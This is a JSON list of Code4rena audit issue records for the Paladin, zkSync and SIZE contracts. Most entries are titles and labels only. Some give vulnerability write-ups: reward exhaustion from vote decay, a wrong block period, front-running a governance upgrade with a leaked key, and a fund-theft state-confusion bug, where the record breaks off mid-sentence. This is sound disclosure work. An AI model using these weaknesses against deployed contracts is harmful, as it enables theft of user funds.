[{"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/99", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "grade-a", "Q-24"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/98", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-14"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/95", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-23"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Pledge may be out of reward due to the decay in veCRV balance. targetVotes is never reached.", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/91", "labels": ["bug", "help wanted", "2 (Med Risk)", "judge review requested", "primary issue", "sponsor confirmed", "selected for report", "M-03"], "target": "2022-10-paladin-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L325-L335 https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L259-L268   # Vulnerability details  ## Impact Pledge may be out of reward due to the decay in veCRV balance. The receiver may lose his reward given to boosters but get nothing in return since her targetVotes is never reached.  ## Proof of Concept According to Curve documentation at https://curve.readthedocs.io/dao-vecrv.html  ``` A user\u2019s veCRV balance decays linearly as the remaining time until the CRV unlock decreases. For example, a balance of 4000 CRV locked for one year provides the same amount of veCRV as 2000 CRV locked for two years, or 1000 CRV locked for four years. ```  On creation, targetVotes = 100, balance = 20 -> votesDifference = 80 -> reward is allocated for 80 votes  ```solidity         // Get the missing votes for the given receiver to reach the target votes         // We ignore any delegated boost here because they might expire during the Pledge duration         // (we can have a future version of this contract using adjusted_balance)         vars.votesDifference = targetVotes - votingEscrow.balanceOf(receiver);          vars.totalRewardAmount = (rewardPerVote * vars.votesDifference * vars.duration) / UNIT;         vars.feeAmount = (vars.totalRewardAmount * protocalFeeRatio) / MAX_PCT ;         if(vars.totalRewardAmount > maxTotalRewardAmount) revert Errors.IncorrectMaxTotalRewardAmount();         if(vars.feeAmount > maxFeeAmount) revert Errors.IncorrectMaxFeeAmount();          // Pull all the rewards in this contract         IERC20(rewardToken).safeTransferFrom(creator, address(this), vars.totalRewardAmount);         // And transfer the fees from the Pledge creator to the Chest contract         IERC20(rewardToken).safeTransferFrom(creator, chestAddress, vars.feeAmount); ```  Then 1 week passed, receiver's balance decay to 10  On creation, targetVotes = 100, balance = 10 but votesDifference stays 80, and reward has only allocated for 80 votes.  ```solidity         // Rewards are set in the Pledge as reward/veToken/sec         // To find the total amount of veToken delegated through the whole Boost duration         // based on the Boost bias & the Boost duration, to take in account that the delegated amount decreases         // each second of the Boost duration         uint256 totalDelegatedAmount = ((bias * boostDuration) + bias) / 2;         // Then we can calculate the total amount of rewards for this Boost         uint256 rewardAmount = (totalDelegatedAmount * pledgeParams.rewardPerVote) / UNIT;          if(rewardAmount > pledgeAvailableRewardAmounts[pledgeId]) revert Errors.RewardsBalanceTooLow();         pledgeAvailableRewardAmounts[pledgeId] -= rewardAmount; ```  A booster boosts 80 votes and takes all rewards in the pool. However, only 80 (From booster) + 10 (From receiver) = 90 votes is active. Not 100 votes that receiver promise in the targetVotes.  Then, if another booster tries to boost 10 votes, it will be reverted with RewardsBalanceTooLow since the first booster has taken all reward that is allocated for only 80 votes.  ## Recommended Mitigation Steps You should provide a way for the creator to provide additional rewards after the pledge creation. Or provide some reward refreshment function that recalculates votesDifference and transfers the required additional reward."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/88", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-22"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/87", "labels": ["bug", "G (Gas Optimization)", "high quality report", "grade-a", "G-13"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/85", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-21"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Unrecoverable assets for fee-on-transfer tokens", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/82", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-20"], "target": "2022-10-paladin-findings", "body": "Unrecoverable assets for fee-on-transfer tokens"}, {"title": "User's reward may be rounded to 0 or truncated when they pledge their voting power.", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/78", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "sponsor disputed", "grade-b", "Q-19"], "target": "2022-10-paladin-findings", "body": "User's reward may be rounded to 0 or truncated when they pledge their voting power."}, {"title": "Fee-on-transfer token not supported as reward token because the totalRewardAmount calculated may be different from the reward token amount we received.", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/74", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-18"], "target": "2022-10-paladin-findings", "body": "Fee-on-transfer token not supported as reward token because the totalRewardAmount calculated may be different from the reward token amount we received."}, {"title": "recoverERC20() Unable to collect processing fee token", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/72", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "sponsor acknowledged", "grade-b", "Q-17"], "target": "2022-10-paladin-findings", "body": "recoverERC20() Unable to collect processing fee token"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/71", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-16"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/69", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-12"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Owner can transfer all ERC20 reward token out using function recoverERC20", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/68", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "M-02"], "target": "2022-10-paladin-findings", "body": "Owner can transfer all ERC20 reward token out using function recoverERC20"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/67", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-11"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/66", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-10"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/63", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-09"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "owner can sweep tokens with two entry points", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/62", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-15"], "target": "2022-10-paladin-findings", "body": "owner can sweep tokens with two entry points"}, {"title": "Due to loss of precision, targetVotes may not reach", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/59", "labels": ["bug", "2 (Med Risk)", "satisfactory", "sponsor acknowledged", "edited-by-warden", "selected for report", "M-01"], "target": "2022-10-paladin-findings", "body": "Due to loss of precision, targetVotes may not reach"}, {"title": "Unsupported fee-on-transfer tokens", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/57", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-14"], "target": "2022-10-paladin-findings", "body": "Unsupported fee-on-transfer tokens"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/56", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-13"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/55", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-08"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/53", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-07"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/51", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-06"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/43", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-12"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/42", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-11"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/35", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-10"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "User will lose their tokens/ Steal from Users", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/27", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "sponsor acknowledged", "grade-b", "Q-09"], "target": "2022-10-paladin-findings", "body": "User will lose their tokens/ Steal from Users"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/26", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-08"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/23", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-07"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/22", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-06"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "high quality report", "grade-b", "G-05"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/20", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "grade-a", "Q-05"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/19", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-04"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/18", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-04"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-03"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/7", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-03"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/6", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-02"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/5", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-a", "G-01"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/3", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "edited-by-warden", "grade-a", "Q-02"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/2", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-01"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/1", "labels": [], "target": "2022-10-paladin-findings", "body": "Agreements & Disclosures"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/361", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-13"], "target": "2022-10-zksync-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/348", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-12"], "target": "2022-10-zksync-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/346", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-11"], "target": "2022-10-zksync-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/341", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-10"], "target": "2022-10-zksync-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/337", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-09"], "target": "2022-10-zksync-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/282", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-08"], "target": "2022-10-zksync-findings", "body": "Gas Optimizations"}, {"title": "`BLOCK_PERIOD` is incorrect", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/259", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected for report", "M-02"], "target": "2022-10-zksync-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-zksync/blob/456078b53a6d09636b84522ac8f3e8049e4e3af5/ethereum/contracts/zksync/Config.sol#L47   # Vulnerability details  The `BLOCK_PERIOD` is set to 13 seconds in `Config.sol`. ```sol uint256 constant BLOCK_PERIOD = 13 seconds; ``` Since moving to Proof-of-Stake (PoS) after the Merge, block times on ethereum are fixed at 12 seconds per block (slots). https://ethereum.org/en/developers/docs/consensus-mechanisms/pos/#:~:text=Whereas%20under%20proof%2Dof%2Dwork,block%20proposer%20in%20every%20slot.  ### Impact This results in incorrect calculation of `PRIORITY_EXPIRATION` which is used to determine when a transaction in the Priority Queue should be considered expired.  ```sol uint256 constant PRIORITY_EXPIRATION_PERIOD = 3 days; /// @dev Expiration delta for priority request to be satisfied (in ETH blocks) uint256 constant PRIORITY_EXPIRATION = PRIORITY_EXPIRATION_PERIOD/BLOCK_PERIOD; ``` The time difference can be calulated ```python >>> 3*24*60*60 / 13    # 3 days / 13 sec block period 19938.46153846154 >>> 3*24*60*60 / 12    # 3 days / 12 sec block period 21600.0 >>> 21600 - 19938      # difference in blocks 1662 >>> 1662 * 12 / (60 * 60) # difference in hours 5.54 ``` By using block time of 13 seconds, a transaction in the Priority Queue incorrectly expires 5.5 hours earlier than is expected.  5.5 hours is a significant amount of time difference so I believe this issue to be Medium severity.  ### Recommendations Change the block period to be 12 seconds ```sol uint256 constant BLOCK_PERIOD = 12 seconds; ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/239", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-10"], "target": "2022-10-zksync-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/233", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-07"], "target": "2022-10-zksync-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/227", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-09"], "target": "2022-10-zksync-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/224", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-06"], "target": "2022-10-zksync-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/212", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-08"], "target": "2022-10-zksync-findings", "body": "QA Report"}, {"title": "zkSyncFee will be locked in MailboxFacet", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/186", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-07"], "target": "2022-10-zksync-findings", "body": "zkSyncFee will be locked in MailboxFacet"}, {"title": "When user deposit in L1ETHBridge.sol, they can avoid paying the fee by making msg.value == amount", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/172", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-06"], "target": "2022-10-zksync-findings", "body": "When user deposit in L1ETHBridge.sol, they can avoid paying the fee by making msg.value == amount"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/158", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-05"], "target": "2022-10-zksync-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-05"], "target": "2022-10-zksync-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/117", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-04"], "target": "2022-10-zksync-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/111", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-03"], "target": "2022-10-zksync-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/110", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-04"], "target": "2022-10-zksync-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/80", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-02"], "target": "2022-10-zksync-findings", "body": "Gas Optimizations"}, {"title": "security Council Members are never set", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/77", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-03"], "target": "2022-10-zksync-findings", "body": "security Council Members are never set"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/49", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-a", "selected for report", "Q-02"], "target": "2022-10-zksync-findings", "body": "QA Report"}, {"title": "diamondCut is not protected in case of governor's key leakage", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/46", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor confirmed", "edited-by-warden", "selected for report", "M-01"], "target": "2022-10-zksync-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/facets/DiamondCut.sol#L46 https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/libraries/Diamond.sol#L277   # Vulnerability details  ## Impact  When the governor proposes a diamondCut, governor must wait for `upgradeNoticePeriod` to be passed, or security council members have to approve the proposal to bypass the notice period, so that the governor can execute the proposal.  ```    require(approvedBySecurityCouncil || upgradeNoticePeriodPassed, \"a6\"); // notice period should expire    require(approvedBySecurityCouncil || !diamondStorage.isFrozen, \"f3\"); ```  If the governor's key is leaked and noticed by zkSync, the attacker must wait for the notice period to execute the already proposed diamondCut with the malicious `_calldata` based on the note below from zkSync, or to propose a new malicious diamondCut. For, both cases, the attacker loses time.  >NOTE: proposeDiamondCut - commits data associated with an upgrade but does not execute it. While the upgrade is associated with facetCuts and (address _initAddress, bytes _calldata) the upgrade will be committed to the facetCuts and _initAddress. This is done on purpose, to leave some freedom to the governor to change calldata for the upgrade between proposing and executing it.  Since, there is a notice period (as zkSync noticed the key leakage, security council member will not approve the proposal, so bypassing the notice period is not possible), there is enough time for zkSync to apply security measures (pausing any deposit/withdraw, reporting in media to not execute any transaction in zkSync, and so on).  But, the attacker can be smarter, just before the proposal be executed by the governor (i.e. the notice period is passed or security council members approved it), the attacker executes the proposal earlier than governor with the malicious `_calldata`. In other words, the attacker front runs the governor.  Therefore, if zkSync notices the governor's key leakage beforehand, there is enough time to protect the project. But, if zkSync does not notice the governor's key leakage, the attacker can change the `_calldata` into a malicious one in the last moment so that it is not possible to protect the project.   ## Proof of Concept https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/libraries/Diamond.sol#L277 https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/facets/DiamondCut.sol#L46   ## Tools Used  ## Recommended Mitigation Steps  `_calldata` should be included in the proposed diamondCut: https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/facets/DiamondCut.sol#L27  Or, at least one of the security council members should approve the `_calldata` during execution of the proposal."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/35", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "G-01"], "target": "2022-10-zksync-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/13", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-a", "Q-01"], "target": "2022-10-zksync-findings", "body": "QA Report"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-10-zksync-findings/issues/1", "labels": [], "target": "2022-10-zksync-findings", "body": "Agreements & Disclosures"}, {"title": "Denial of service when `baseAmount` is equal to zero", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/332", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "duplicate-18", "M-07"], "target": "2022-11-size-findings", "body": "Denial of service when `baseAmount` is equal to zero"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/326", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-31"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/324", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-29"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/322", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-30"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/321", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-28"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/314", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-29"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/313", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-28"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/312", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-27"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/311", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-27"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/310", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-26"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/306", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-25"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/305", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-26"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/303", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-24"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/302", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-23"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/296", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-25"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/295", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-24"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/291", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-22"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/288", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-21"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/287", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-20"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/283", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-23"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/274", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "edited-by-warden", "Q-19"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/273", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-22"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/270", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-18"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/267", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "edited-by-warden", "Q-17"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/258", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-16"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Attacker can steal any funds in the contract by state confusion (no preconditions)", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/252", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-02"], "target": "2022-11-size-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L33 https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L238   # Vulnerability details  HIGH: Attacker can steal any funds in the contract by state confusion (no preconditions) LOC: https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L33 https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L238  ## Description  Auctions in SIZE can be in one of several states, as checked in the atState() modifier:  ``` modifier atState(Auction storage a, States _state) {     if (block.timestamp < a.timings.startTimestamp) {         if (_state != States.Created) revert InvalidState();     } else if (block.timestamp < a.timings.endTimestamp) {         if (_state != States.AcceptingBids) revert InvalidState();     } else if (a.data.lowestQuote != type(uint128).max) {         if (_state != States.Finalized) revert InvalidState();     } else if (block.timestamp <= a.timings.endTimestamp + 24 hours) {         if (_state != States.RevealPeriod) revert InvalidState();     } else if (block.timestamp > a.timings.endTimestamp + 24 hours) {         if (_state != States.Voided) revert InvalidState();     } else {         revert();     }     _; } ```  It's important to note that if current block timestamp is greater than endTimestamp, `a.data.lowestQuote` is used to determine if 